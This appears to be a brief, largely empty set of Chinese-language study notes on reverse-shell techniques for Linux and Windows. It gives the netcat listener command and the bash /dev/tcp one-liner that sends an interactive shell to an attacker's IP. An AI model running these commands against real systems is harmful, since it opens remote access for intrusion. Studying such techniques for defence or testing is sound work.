# Linux

## bash反弹shell

nc.exe：瑞士军刀。监听端口，传输数据，连接端口

```
攻击方：nc -lvp xxx：监听端口
受害者：bash -i >& /dev/tcp/攻击方服务器IP/端口 0>&1：产生交互式shell
	>&：将成功输出和报错的输出都输出出来
	0:标准输入
	1：标准输出
	2：错误
```



## nc反弹shell

条件：目标安装了nc

```
nc -e
```



## telnet反弹

条件：目标支持telnet



## 脚本反弹



# Windows

## nc反弹



## powershell反弹



## msf反弹



## Cobalt Strike

内网渗透工具，支持团队作战
